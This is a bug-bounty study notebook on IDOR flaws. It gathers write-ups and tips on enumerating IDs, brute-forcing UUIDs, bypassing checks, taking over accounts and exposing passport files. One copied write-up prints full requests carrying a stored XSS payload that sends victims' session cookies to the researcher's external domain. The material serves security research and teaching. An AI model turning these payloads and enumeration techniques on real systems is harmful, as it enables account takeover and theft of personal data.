
# Foundamentals


> Make sure you make notes while learning so you can revise in future

# **0. Index**

![](https://miro.medium.com/v2/resize:fit:656/1*UHSwzq1MHMa0zjuqfzLdQg.png)

### 1. GitHub Repositories

All these GitHub Repositories contains 1000+ Hackerone reports to read from which you can learn how bug bounty hunters did recon to find IDOR Vulnerability, I suggest read atleast 300 reports to get your own unique perspective on IDOR Vulnerability.

> https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPIDOR.md

> [devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups?source=post_page-----84e44052f70c--------------------------------#insecure-direct-object-reference-idor)

> [HackerOneReports/InsecureDirectObjectReferenceIDOR at master · maverickNerd/HackerOneReports](https://github.com/maverickNerd/HackerOneReports/tree/master/InsecureDirectObjectReferenceIDOR?source=post_page-----84e44052f70c--------------------------------)

### 2. Critical/Highest bounty through IDOR Vulnerability

<iframe width="681" height="382" src="https://www.youtube.com/embed/wx5TwS0Dres" title="IDOR - how to predict an identifier? Bug bounty case study" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="681" height="382" src="https://www.youtube.com/embed/FzT3Z7tgDSQ" title="$5,000 YouTube IDOR - Bug Bounty Reports Explained" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="681" height="382" src="https://www.youtube.com/embed/NtjlGV7Cdvk" title="$28k IDOR that broke Apple Shortcuts - Apple bug bounty" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

### 3. All possible parameters for IDOR and real life examples of each

<iframe width="681" height="382" src="https://www.youtube.com/embed/BfbS8uRjeAg" title="[Part I] Bug Bounty Hunting for IDORs and Access Control Violations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="681" height="382" src="https://www.youtube.com/embed/jTdqM2aO4Ys" title="[Part II] Bug Bounty Hunting for IDORs and Access Control Violations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="681" height="382" src="https://www.youtube.com/embed/EeBSqo7N2Bs" title="[Part III] Bug Bounty Hunting for IDORs &amp; Access Controls" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


books: [Hacking Books | Biscuit's Bug Bounty Playbook](https://oreobiscuit.gitbook.io/introduction/mains/learn-the-basics/hacking-books)

----

## Quick Tip for IDOR:

🔐 Most researchers test for IDOR after login… But what if we told you that <span style="color:rgb(255, 192, 0)">many applications leak sensitive user data without any session at all?
</span>

🧪 Sessionless IDOR Enumeration – Real-World Hunting Method

✅ Step 1: Identify public resource endpoints   Examples:  
- /api/user/<user_id>/profile-pic   
- /files/uploads/[user_1223.png](http://user_1223.png?trk=public_post-text)


✅ Step 2: Start bruteforcing IDs or filenames without logging in
Look for direct 200 responses or open downloads.

✅ Step 3: Analyze filenames or response metadata  
Many times these leak internal IDs, emails, or predictable patterns.  
Also test: ?preview=true or ?inline=1

✅ Step 4: Try calling internal APIs unauthenticated  
Examples:
  - /api/resource/User/<*id*>  
  - /api/resource/Lead/<*id*>

✅ Step 5: If user data loads without auth…  
💥 You’ve found unauthenticated IDOR or full user enumeration.

🔍 Why this matters:
✔️ Most hunters never test without login  
✔️ Static files + forgotten APIs are often left exposed   
✔️ This technique can escalate to privilege abuse or data exfiltration silently

by: https://www.linkedin.com/company/cyberneogen?trk=public_post_feed-actor-name
#### Other Examples:

if you find an endpoint like this:

```
https://app.target.com/profile?user=123
```

Try this Payload:

```
https://app.target.com/profile?user=123&user=456
```

Let’s say the endpoint is:

```
https://secure.app.com/settings?mode=view
```

I crafted:

```
https://secure.app.com/settings?mode=view&mode=admin
```

Curl Test:

```bash
curl -v "https://secure.app.com/settings?mode=view&mode=admin"
```

----

#IDOR_Tips

![[Pasted image 20241130191236.png]]

![[Pasted image 20241130191245.png]]

![[Pasted image 20241130195319.png]]

## Bug Bounty Trick: Bypass Invalid ID Validation via Array Injection 

_Sometimes a small change makes a big difference!

**🔍 Original Request:**
**DELETE /api/bookings?bookings=3777104**
**❌ Response: 400 Bad Request — "Invalid Bookings"**

**✅ Modified Request:**
**DELETE /api/bookings?bookings[]=3777104**
**💥 Response: 200 OK — Booking successfully deleted!**

📌 Why This Works:
Some backends treat bookings= as a scalar (single ID), while bookings[]= is interpreted as an array of IDs.

If the API logic expects an array, this simple tweak can bypass input validation or authorization checks, potentially leading to:

🛑 IDOR (Insecure Direct Object Reference)
🗑 Unauthorized Deletion of Bookings
📬 Mass Resource Tampering (loop over IDs)

🔧 Tip: Always test both forms:
```bash
param=value
param[]=value
```

----

 **Tip:**


```
When hunting for IDORs during a bug bounty program, consider the following tip: 
 
1. Leverage archive tools: Utilize tools like Wayback Machine or specialized software like Waymore to manually archive and analyze subdomains. This can help uncover hidden or previously accessible endpoints that may now be vulnerable to IDORs. 
 
Example usage: 
python3 waymore.py -i sub.target.com -mode U -xcc 
 
2. Extract all paths with specific keywords: After identifying potential paths, extract all URLs containing specific keywords, such as "admin" or "manager," to narrow down your search. 
 
Example command: 
cat result.txt | grep "admin"  (after admin fuzz that path)

 
3. Fuzzing: If you find a suspicious path but it doesn't yield any results, try fuzzing the URL with a wordlist. This can help uncover hidden or unintended parameters. 
 
Example usage: 
ffuf -u https://sub.taget.com/promo/offer/1234/FUZZ -mc 200 
 
4. Brute force: If you find a path with a dynamic ID, consider brute-forcing the last digits or numbers. This can help uncover additional sensitive information or functionality. 
 
Example scenario: 
Found path: https://sub.taget.com/promo/offer/1234/details 
 
Brute-force the last 3 digits: 1234 
 
 
By following these steps, you can uncover hidden or unintended IDORs, leading to potential security vulnerabilities and rewards in bug bounty programs.
```

---

### Example report:

I noticed something strange… After resetting my password using my email, receiving the link, entering a new password, and clicking **Change Password**, I found that my email was being sent in the request.

![](https://miro.medium.com/v2/resize:fit:656/1*8ctRHOtXTuQN0uQa-CcplA.png)

Strange, right?

Of course, the first thought that came to mind was, _what would happen if I changed the email to someone else’s email?_ So, I quickly created another account and tried to reset its password by replacing my email with the second account’s email in the request. Unfortunately, I got a `200 OK` response, but it said **Reset Password Failed**.

![](https://miro.medium.com/v2/resize:fit:656/1*1bavXCFObvmdAiBHPQoutw.png)

Looks secure, doesn’t it?

But giving up isn’t an option!

I then noticed a parameter called **frm_check**, which seemed like a token tied to my original email. If I changed the email, the server would check this token to ensure it hadn’t been altered. So, I started thinking about how to bypass the **frm_check**.

And what do you think happened when I simply removed the **frm_check** parameter from the request?

**It worked !!**

![[Pasted image 20241201200239.png]]

The request bypassed the check, returned a **302 redirect**, and sent me to the login page. When I tried logging in with the second account’s email and the new password, it successfully logged me in.

With this, I realized I could take over any account on the website without any user interaction.

I reported the vulnerability, and within just one day, it was triaged and marked as Critical.

![](https://miro.medium.com/v2/resize:fit:369/1*_1v7AEVTmEAVBT6bJbfAuw.png)

---

## Get Your First Bug Bounty with Burp Suite’s Match and Replace Feature

> https://medium.com/@mahdisalhi0500/get-your-first-bug-bounty-with-burp-suites-match-and-replace-feature-7a32f81a3cb0

# What’s the Best Point of This Tip (for Me)?

A lot of hunters use Match and Replace for different types of bugs, but for me, the best point is that Match and Replace is a very crazy tool in API testing.

**Why?**  
The structure of JSON or JavaScript, especially in RESTful APIs, often includes parameters like:

- `isAdmin: false`
- `isPaid: true`
- `hasBeenVoted: false`

**But How Can This Information Help Me Get My First Bug?**

Sometimes, you can find critical bugs just by understanding the API’s response and using Match and Replace. Trust me, many hunters have done this (including me! 😘). Let me give you a scenario to help you understand better:

# Example:

Imagine you open a page with different privilege types of users. Let’s say your current role is a “guest.” You open Burp Suite and capture the following JSON payload in the response:

```json
{  
  "company": "HackMe",  
  "isAdmin": "false",  
  "isModerator": "false",  
  "isGuest": "true"
```

In the user interface, as a guest, you only see limited features, like the ability to comment. You cannot delete or edit other members’

![](https://miro.medium.com/v2/resize:fit:700/1*LsFFRXqeLkGtGjG1J9HB_Q.png)

![](https://miro.medium.com/v2/resize:fit:700/1*tFthGU2VoRuJAg4T-y0j8Q.png)

**1.by this change the UI change From Guest To admin UI (Unlocks Edit Post and ever thing related To Admin UI )**

**2. now try those API call and see what is the valid one and Get your bounty 🤑**

# Tips I Use on Every Target Every Time with This Tool

Every time I test a new target, I always try this:

**MATCH:** `False` → `True`

Sometimes, I get surprised by the results!

- **Easy Cases:** Sometimes, it’s easy to make API calls.
- **Hard Cases:** Other times, it’s harder, but Match and Replace helps a lot to find these API calls.

**Remember:**  
You can try this on any JSON payload. The best results happen when changing values also changes the **UI.** Why? Because this type of bug usually comes from the **backend** not checking things properly.


# The best References :

<iframe width="680" height="382" src="https://www.youtube.com/embed/YXWaDIZyLfg" title="Response manipulation leads to purchase free items (Arabic)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="680" height="382" src="https://www.youtube.com/embed/GvBi17HfSqU" title="Match &amp; Replace - HTTP Proxies&#39; Most Underrated Feature (Ep. 76)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


---

The beginner stuck with this kind of uuid ,no worries folks ill help with a github tool:

#IDOR_Tips 

> GET /api/uuid=880e5400-31sn-13ns-13122001312002 HTTP/1.1

> uuid-enum

![](https://miro.medium.com/v2/resize:fit:700/1*vY3R1fxpBiKye0vZTlAkdw.png)

This tool helps you to bruteforce the uuid ,until it finds a valid uuid,I just give the link below for u guys

https://github.com/it4chis3c/uuid-enum

```bash
Steps to install it

Step 1: git clone [https://github.com/it4chis3c/uuid-enum.git](https://github.com/it4chis3c/uuid-enum.git)

Step 2: cd uuid-enum

Step 3: Run the command — pip install -r requirements.txt

Note that if u kali linux u neeed to create a venv

Step 4:python3 uuid_enum.py -u “[https://target.com/user/UUID_HERE](https://api.target.com/user/UUID_HERE)" -m sequential -c 100 -t 10 -o 5
```

---
## Tutors:

<iframe width="928" height="522" src="https://www.youtube.com/embed/wx5TwS0Dres" title="IDOR - how to predict an identifier? Bug bounty case study" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="928" height="522" src="https://www.youtube.com/embed/C6kw1NM6I3g" title="#5 Broken Access Control OWASP TOP 10 - 2021 - بالدارجة" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>



— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

**After signing up, I got a verification link to activate my account. Once activated and logged in to the system**, I opened the network panel, started analyzing the website’s requests, and stumbled upon some interesting URLs.

![](https://miro.medium.com/v2/resize:fit:875/1*1DcYe2-1KD6VT4wG-ffNig.png)

I copied the request as a **cURL** command, ran it, and got the response in **JSON** format.

![](https://miro.medium.com/v2/resize:fit:875/1*3KobIoHWxbWmjxsfD9839g.png)

and if I change the request and set the ID to 37 I get this response

![](https://miro.medium.com/v2/resize:fit:875/1*2gCrVB-qWw9_iwK3AIIkxQ.png)

I went back to the login page and navigated to the reset password page to request a new password

![](https://miro.medium.com/v2/resize:fit:875/1*g0xynnKQdcYMpHUPgkBjkw.png)

As we can see, the link contains the user token, which we can access, thanks to the previous IDOR vulnerability. So, I decided to create a new user account just to hack myself 👻.

I requested a password reset and sent it to my other account. Then, I checked the user reset password token, replaced it with the token I grabbed earlier, and boom 💥 I successfully changed my other account’s password. This same trick could work on any account on the website.

----
### $3150 bugbounty | IDOR via file upload at twitter asset | bug bounty poc


![[Pasted image 20241210233432.png]]

**Tip:** if you ever come accross an id in the file upload, try to make two accounts, one in where which, you upload the file and intercept the request by inspecting the page:

						(try it with user id too)

![[Pasted image 20241210233720.png]]

And in the attacker account you will start intercepting the request and then upload the file (click forward until you see the **metadata of the file**, AND if you find an id inside the metadata of the file uploaded, then try to change it to the victim account file ID, which we uploaded before:

![[Pasted image 20241210233246.png]]

				then send the request


And then reload the page of the victim user:

![[Pasted image 20241210234100.png]]

---


https://youtu.be/bnUaapqW7S4 ---easy to find IDOR


---

## Breaking the Invite: 3 Easy-to-Find Vulnerabilities in invite users functionality

When testing any feature, the first thing you should do is observe how it behaves under different situations. For our case “ user invitations” function , here are some basic but important questions to ask yourself:

- What happens if I invite a user who is already part of another organization? Will they receive an invitation link, or will they be added automatically?
- If I delete the invitation before it’s accepted, does the link still work?
- If another user somehow gets access to the invitation link, can they use it to log into my account?
- Is there any limit to the number of users I can invite to my dashboard?

These may seem like simple or outdated scenarios, and you might think they’re no longer relevant in bug bounty hunting. But the goal here isn’t just to report them directly. Instead, **you should try to abuse the logic behind these edge cases** to discover something deeper.

Let me walk you through **three real bugs** I found by testing these “weak” scenarios. I’ll also share some **bonus test ideas** at the end.

### Bug #1: IDOR — ==Unauthorized User Name Modification Across Organizations==

While testing, I noticed that if you invite a user who’s already a member of another organization, **they are added directly without receiving an invitation link**. This isn’t best practice, but not something worth reporting on its own.

However, I discovered that **high-privileged users can update the names** of users within their organization. That made me ask:

> What happens if I change the name of a user I invited from another organization? Will it affect their profile in the original organization too?

To test this, I created two separate organizations and invited the same user to both. Then I updated the user’s name from one organization — **and the change reflected across all organizations that user belonged to.**

## Steps to Reproduce:

1. Navigate to the dashboard: `[https://app.example.com](https://app.example.com/)`
2. Invite a user (e.g., `victim@email.com`) who already belongs to another organization.
3. Change their name (e.g., First Name: “Victim”, Last Name: “Victim”).
4. Check their profile in the original organization — the name will be changed there too.

i think this happens because the application **stores user profile data globally**, not per organization.  
When a user is in multiple orgs, their name is pulled from a **single user record** in the database.  
So, an update from Org A is reflected in Org B, C, and so on. and this just a thought of course .

Triaged as Critical 🤑🤑

### Bug #2: Privilege Escalation — Downgrading and Deleting a Super Admin

In my program, there are four user roles:

- Owner
- Super Admin
- Admin
- User

As an Admin, I can invite users and assign them either Admin or User privileges. The invitation flow works like this, You fill out the invitation form with:

- User email
- User name
- User role

![](https://miro.medium.com/v2/resize:fit:449/1*-i15peUROKZaUnK3YoXwzg.png)

During testing, I attempted to escalate my own privileges to Owner or Super Admin, but it didn’t work.  
However, I discovered something interesting:

> _I was able to invite_ **_existing users_** _again ,using the same email but with a different name and role._

For example, if a user with the email `victim@email.com` already exists, **I could invite him again with a different name and role, and the system would accept it.** 

It didn’t show any error like “User already exists” ,it just processed the invitation and added them again. That made me wonder

- what if I tried to invite the Owner again but with a lower role?
- I tested it… but unfortunately, it didn’t work.

Then I wondered:  
_What if I invited a_ **_Super Admin_** _again, but this time as a_ **_User_**_?_

And guess what?  
It **worked**! 😄

_The Super Admin was downgraded to a User.  
Since Admins can delete Users, I was able to **delete the downgraded Super Admin** ,an action that should only be allowed by the Owner._

## Steps to Reproduce:

1. Log in as an Admin.
2. Go to the User Management Page → Click “Add User”.
3. Enter the same name and email as an existing Super Admin.
4. Assign a lower role (e.g., User).
5. Click OK. The Super Admin will now appear as a User.
6. Click the delete button — the Super Admin is now removed.

Triaged as High 🤑

## Additional Test Scenarios

**1. Test for User Limits & Race Conditions**

Some apps limit the number of users per organization (e.g., 5 max).  
Here’s how to test for race conditions:

- Add 4 users normally.
- For the 5th, capture the request and duplicate it 3–5 times.
- Send all requests in parallel.

If vulnerable, the system may add more than 5 users — **a valid bug**.

---

### Discovered 30 BOLA + IDOR vulnerabilities in a single subdomain (BBP).


# Step 1: Collecting Endpoints

The first step in identifying any vulnerability is gathering all the endpoints available on the website. There are various methods to achieve this, but I prefer using JavaScript files for this task because they often contain useful routes.

I began by accessing the website and extracting JavaScript files. These files revealed several endpoints used on the site, which was dedicated to creating meetings and live streaming.

Here are some of the endpoints I found:

```js
children: [{  
    path: "/",  
    element: (0, C.jsx)(o.C5, { to: "/classrooms" })  
}, {  
    path: "/classrooms/",  
    element: (0, C.jsx)(te, {})  
}, {  
    path: "/classrooms/create",  
    element: (0, C.jsx)(ie, {})  
}, {  
    path: "/classrooms/:id",  
    element: (0, C.jsx)(oe, {})  
}, {  
    path: "/sessions",  
    element: (0, C.jsx)(J, {})  
}, {  
    path: "/sessions/create",  
    element: (0, C.jsx)($, {})  
}]
```

These endpoints were accessible and revealed sensitive data through the API, such as:

```
https://class.test.com/api/sessions/
```

This was my first indication of a potential vulnerability, as sensitive data was exposed through the API.


# Step 2: Testing for Dangerous Methods

Next, I examined the JavaScript files more closely to check what HTTP methods were supported by these endpoints. I found that some endpoints accepted the `DELETE` method, which posed a significant risk.

# Sending a DELETE Request

I sent a `DELETE` request to the following endpoint:

```
DELETE class.test.com/api/classrooms/:id
```

To my surprise, this request successfully deleted a classroom! This turned what I initially thought was just data leakage into a much more severe vulnerability — data deletion.

_I escalated this finding and reported the vulnerability with a higher severity rating._

 Testing Other Endpoints:

**I repeated this process for other endpoints, attempting to delete other resources and escalate the severity of any discovered vulnerability.**

## Step 3: Exploring Potential Data Leaks

Now, I wanted to test for more data leaks, especially information about the admin and user roles. Here’s how I approached it:

# Creating Test Accounts

I created two accounts on the site:

1. **Admin Account**
2. **User Account**

# Adding User to a Classroom

From the **Admin Account**, I created a classroom and added the **User Account** to it. I then enabled proxying for the **User Account** and disabled it for the **Admin Account**.

# Inspecting HTTP History

I used the **User Account’s** browser and began inspecting the HTTP history. I filtered for any sensitive information that could be related to the **Admin Account**, such as the admin’s email.

By clicking on various links and monitoring the HTTP history, I was able to identify several instances where sensitive data leaked due to the lack of proper access control.

# Escalating Privileges

Once I identified data leaks, I manipulated the HTTP methods. For example, I changed the HTTP method to `DELETE` and tested whether I could remove the **User Account** from the classroom.

This testing helped me identify a higher-risk vulnerability: the ability to escalate privileges and affect users in an unauthorized manner.

# Step 4: Gathering Additional Admin Data

To ensure I didn’t miss any important endpoints, I performed one more round of tests focused on gathering any admin-specific information that might still be exposed.

# Inspecting Admin Data

I used the **Admin Account’s** browser and disabled the proxy to capture any sensitive data in the HTTP history. I specifically looked for links that returned data in JSON format (like API responses). One example was:

```
https://test.test.com/api/recordings/<id>
```

I gathered all these links and tested them by opening them in the **User Account’s** browser. This allowed me to confirm **if sensitive admin data could be accessed by a regular user.**

by: https://hackerone.com/im4x?type=user


---

### How I Prevented a Data Breach by Reporting an IDOR in a System Exposing over 500,000 US Passports

#File_Upload 

As part of my Reconnaissance strategy, I always do a quick Facet Analysis on [_Shodan.io_](https://www.shodan.io/search/facet?query=ssl%3A%22tesla.com%22&facet=http.title)_._ The facet analysis feature of Shodan.io is a powerful tool that allows users to quickly filter and summarize search results based on specific characteristics (facets) of the data. Facets are essentially categories or fields that provide aggregated insights into the data, such as **operating systems, ports, cities, ISPs, HTTP titles, and more. I tend to do a quick overview of the http.title.**

![](https://miro.medium.com/v2/resize:fit:700/1*inBJg1ORkp8_hA6HDpsx3Q.png)

I found the target API via the Facet Analysis

Here’s a list of HTTP titles that are often associated with systems prone to vulnerabilities:

```
BIG-IP  
Apache Tomcat  
OpenVPN  
Fortinet/FortiGate  
Citrix== ==Gateway== ==(NetScaler)====  
Dashboard / Login  
PHPMyAdmin  
Cisco ASA  
Oracle WebLogic  
Microsoft Exchange  
SolarWinds  
Elasticsearch  
Nagios  
Drupal  
Zimbra  
Jenkins  
Splunk  
WordPress  
Nginx  
GlassFish  
Palo Alto Networks  
IBM WebSphere  
SonicWall  
VMware Horizon  
MikroTik RouterOS  
Check Point  
Trend Micro  
Atlassian Confluence  
SAP NetWeaver  
Kubernetes Dashboard
```

You can accomplish the same using [httpx from Project Discovery:](https://github.com/projectdiscovery/httpx)

`cat domains.txt | httpx -sc -ip -server -title -wc` 

![](https://miro.medium.com/v2/resize:fit:700/1*2MS_PhE5KnJhnRBiaEUYEg.png)

								Scan of indeed.com

While searching for a target similar to the Tesla one, I revisited a website I’d used 5–6 years ago. I can’t disclose the name of the organization but I had a pretty good idea of what to expect. However, I stumbled upon a title that caught my eye. It was something like **“Submission System” —** a pretty interesting title.

![](https://miro.medium.com/v2/resize:fit:582/1*gzKFJVI29rBDFAxfkJd9fg.png)

					From shodan.io

I remembered using this application like 5–6 years ago and I had submitted my passport so I was given an option to print or download the file.

![](https://miro.medium.com/v2/resize:fit:700/1*byUAsafX0YOy5fIwFhw-PA.png)

After I clicked Documents > Download, my file automatically downloaded, however, the download button would do an HTTP GET request to:

`/production/api/v1/attachment?id=4550381&enamemId=123888`

I caught it on Burp Suite and I had two juice parameters.

```
1. id= [ID of the file]
2. userID
```

**Now it’s easy to guess what happened, by changing the file ID you can download different files without having to be the “owner” of the file.**

An **IDOR (Insecure Direct Object Reference)** is a type of security vulnerability that occurs when an application provides direct access to objects (like files, database records, or URLs) based on user-supplied input _(attachment?id=4550381&enamemId=123888)_ without properly verifying whether the user has permission to access those objects.

The result was hundreds of thousands of these:

![](https://miro.medium.com/v2/resize:fit:700/1*5eKnhUm4PSUhpEfaO_c5xQ.png)

Every ID was a different document. Absolutely insane.

I also found another endpoint named _“_`attachment-list`_”._ Together with the parameter `enamemId`I went to:

```http
/api/v1/attachment-list?enamemId=123888
```

Among the files I had uploaded, I found:

![](https://miro.medium.com/v2/resize:fit:644/1*R01JkofxI0SfvMgQmF25lw.png)

Take a second to see that. Can you find the red flag? Remember the GET request to download the file?

```
/production/api/v1/attachment?id=4550381&enamemId=123888
```

# Understanding the Vulnerability

1. **Absence of** `**enamemId**`**:**

- If the API endpoint returns data where `enamemId` is consistently `null` or not provided, it suggests that the endpoint might not enforce proper access controls based on user identification or ownership.

**2. User Uploads:**

- If users are uploading files and those files do not have an associated `enamemId`, it could mean that the **API lacks a mechanism to tie uploaded files to specific users or entities.** This could potentially lead to unauthorized access to other users' files if there's no verification or association mechanism.

The files do not have an owner. Anyone can access them without having to be the legitimate owner.

Interestingly enough, I was not able to get the API to show me the files of user using by manipulating the param `enamemId`:

`/api/v1/attachment-list?enamemId=xxxxxxx`

As I was preparing the report for the organization, the following actions were recommended:

1. **Implement Access Control:**

- Ensure proper authorization checks are in place to verify that the requesting user has permission to access the requested resource.
- Utilize user session information to confirm that the user is entitled to access the specific attachment.

**Use Indirect References:**

- Replace direct references to objects (e.g., attachment IDs) with indirect references such as tokens or hashed values that are mapped to actual object IDs on the server side.

**3. Input Validation:**

- Validate the `id` parameter to ensure it adheres to expected formats and values.
- Implement rate limiting to prevent automated exploitation

1. **Secure API Design:**

- Adopt security best practices for API design, including the use of OAuth, secure tokens, and ensuring all endpoints are protected by proper authentication and authorization mechanisms.

----

# Hijacking Sessions with IDOR and XSS— @bxmbn


![](https://miro.medium.com/v2/resize:fit:296/1*uZVRQLCrYe317Jb21hSecA.png)

Picture a platform designed to handle sensitive documentation — think insurance claims or identity verification — turning into a goldmine for attackers. That’s what I stumbled into while exploring a file upload feature on an insurance-related portal. What began as a quick test ballooned into a cross-site scripting (XSS) vulnerability that could enable mass account takeovers. Let’s dive in.

# The Entry Point

The system let users upload files to back up their forms — a routine feature for this kind of platform. You’d submit a file, it’d get linked to a reference number (**refNo**) (say, **R2326400539** for a user we’ll call John), and later you could view it through a separate page:

> https://[redacted].com/xxx.asp?refNo=**R2326400539

Nothing fancy on the surface. But when I peeked at the upload request, I spotted a parameter called **fileUidList** — a string defining the file’s metadata. Curiosity kicked in: what if I messed with it?

I crafted a request, slipped an XSS payload into **fileUidList**, and tied it to a valid reference number, like **R2326400540** in the **njfbRefNo** Parameter. The server didn’t flinch — it swallowed my tampered upload whole.


# Lighting the Fuse

Here’s the request I used to trigger a simple alert


```bash
POST /[redacted]/[redacted].do HTTP/1.1  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: multipart/form-data; boundary=---------------------------25285536543518840322221354714  
Content-Length: 761  
Origin: [redacted]  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Te: trailers  
Connection: close  
  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="njfbRefNo"  
  
R2326400540  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="actId"  
  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="maxUploadContentSize"  
  
104857601  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="fileUidList"  
  
10006630~!~/[redacted]/a/unix/apps/WAS/FileService/files/[redacted]/2023/9/21~!~xss"><svg><set onbegin="d=document,b='`',d['loca'+'tion']='javascript:aler'+'t'+b+domain+b"> .png~!~649159  
-----------------------------25285536543518840322221354714--
```


Server responded 200 Ok and the XSS payload was now saved into **refNo** **R2326400540**

>https://[redacted].com/xxx.asp?refNo=R2326400540

# From XSS to Account Takeover

Since my malicious file was now stored under a user’s reference ID, it hit me: this could target anyone — past, present, or future users. Those reference numbers are numeric and predictable, so an attacker could hit them systematically. Even better (or worse), the session cookie — let’s call it **SESSIONID** — wasn’t flagged as HTTP-only, meaning JavaScript could snatch it.


I upped the ante with a new payload. This time, I set **fileUidList** to redirect the victim’s browser to a domain I controlled , appending their cookies to the URL. Here’s the request:

```bash
POST /[redacted]/[redacted].do HTTP/1.1  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: multipart/form-data; boundary=---------------------------25285536543518840322221354714  
Content-Length: 761  
Origin: [redacted]  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Te: trailers  
Connection: close  
  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="njfbRefNo"  
  
R2326400551  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="actId"  
  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="maxUploadContentSize"  
  
104857601  
-----------------------------25285536543518840322221354714  
Content-Disposition: form-data; name="fileUidList"  
  
10006630~!~/[redacted]/a/unix/apps/WAS/FileService/files/[redacted]/2023/9/21~!~xss"><svg><set onbegin="d=document,b='`',d['loca'+'tion']='//bxmbn.com/?'+b+cookie+b"> .png~!~649159  
-----------------------------25285536543518840322221354714--
```


I uploaded it under **R2326400551**, loaded the view page, and checked my server. Sure enough, John’s **SESSIONID** landed in my logs. With that token, I could slip into his account — no password needed. Scale this across all users, and you’ve got a takeover spree.

# The Kicker: No Authentication Needed

**Here’s the real shocker: the upload endpoint didn’t care if I was logged in. I could send these requests anonymously**, injecting XSS into anyone’s files without ever authenticating. No session validation, no access checks — just an open invitation. That alone makes this a nightmare.


# The Fallout

The impact is brutal. With predictable IDs and no HTTP-only protection on the session cookie, an attacker could automate this — uploading malicious files across a swath of reference numbers, then waiting for victims to trip the wire. Every visit to the view page could hand over their session, **paving the way for mass account takeovers. Stolen accounts, tampered data, or worse could follow.**

The lack of authentication on the upload endpoint seals the deal. ~={blue}You don’t need an account to pull this off — just a connection and some reference IDs. And since future uploads inherit the same flaw, this could haunt the platform indefinitely.=~

# **Scoring the Damage**

Using the CVSS 3.1 calculator, this scores high: network-accessible, low complexity, no privileges required, user interaction needed, and ~={green}a scope change leaking high-confidentiality data. Factor in the critical nature of the data involved, and it’s a top-tier issue.=~

![](https://miro.medium.com/v2/resize:fit:700/1*GKyq_v2s41VD71CC6ZOOCg.png)

# Final Thoughts

This flaw is a perfect storm of oversights: a missing authentication check, a stored XSS vector, ~={orange}and an exposed session cookie turned a standard upload system into an attacker’s playground.=~ The thing here is that an attacker could also edited previous files of users, injecting XSS everyone’s files by just tampering the reference number Paremeter (**njfbRefNo)**

~={orange}Now that I look back, and 5k bounty for this was to low of a bounty, giving that this company is one the biggest.=~

---

## New Reports

After about an hour of clicking, intercepting, and watching JSON responses flow back and forth, I ended up staring at a PUT request to update a user's profile. Seemed harmless enough: `PUT /api/v1/user/profile`. 

It was the usual payload—name, email, phone, a few flags—and everything seemed locked down. The request required authentication, and modifying your own profile worked as expected. But then something caught my eye.

There was a hidden field in the request body — `user_id`. **It wasn't visible in the front end, but it was being sent to the server. And sure enough, it matched my current user ID.** I paused. Why was this being sent from the client at all? Shouldn't the server already know which user is making the request?

So I did what every ethical hacker does in that moment. I changed it.

**I replaced my own user ID with a random one, a number I had seen in another API response while browsing user listings** (this particular program had some limited social features — user search, public profiles, nothing too sensitive). I hit "Send."

The response came back 200 OK.

I refreshed the profile page for that user ID. The name and phone number I had entered were now displayed. My jaw hit the floor. I had just edited someone else's account.

$$_______________________________________________________________________________________$$
# Unmasking the Flaw: The Discovery

